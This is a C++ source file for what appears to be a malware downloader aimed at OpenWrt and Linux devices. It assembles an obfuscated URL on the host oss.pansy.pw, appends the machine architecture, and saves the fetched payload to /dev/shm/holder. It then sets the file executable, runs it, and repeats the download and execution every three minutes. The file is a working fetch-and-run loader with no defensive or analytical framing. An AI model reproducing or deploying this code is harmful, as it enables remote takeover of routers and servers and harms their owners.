#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <sys/wait.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    std::ofstream* ofs = static_cast<std::ofstream*>(userp);
    ofs->write(static_cast<char*>(contents), size * nmemb);
    return size * nmemb;
}

std::string getArchitecture() {
    struct utsname buffer;
    if (uname(&buffer) != 0) {
        perror("uname");
        exit(EXIT_FAILURE);
    }
    return std::string(buffer.machine);
}

void executeFile(const std::string& filePath) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        execl(filePath.c_str(), filePath.c_str(), (char*)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
    } else {
        perror("fork");
    }
}

void downloadAndExecute(const std::string& url, const std::string& outputPath) {
    // std::cout << "Downloading from URL: " << url << std::endl;
    CURL* curl;
    CURLcode res;
    std::ofstream ofs(outputPath, std::ios::binary);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ofs);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

        res = curl_easy_perform(curl);
        std::cout << "Response Code:" << res << std::endl;
        if(res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if(response_code == 200) {
                ofs.close();
                chmod(outputPath.c_str(), 0755);
                curl_easy_cleanup(curl);
                curl_global_cleanup();
                executeFile(outputPath);
                return;
            }
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

int main() {
    std::string arch = getArchitecture();

    const char urlBytes[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'o', 's', 's', '.', 'p', 'a', 'n', 's', 'y', '.', 'p', 'w', '/', 'o', 'p', 'e', 'n', 'w', 'r', 't', '-', '\0' };
    std::string url(urlBytes);
    url += arch;
    const std::string outputPath = "/dev/shm/holder";

    while(true) {
        downloadAndExecute(url, outputPath);
        std::cout << "Execute done " << std::endl;
        sleep(180); // Wait for 3 minutes before the next attempt
    }

    return 0;
}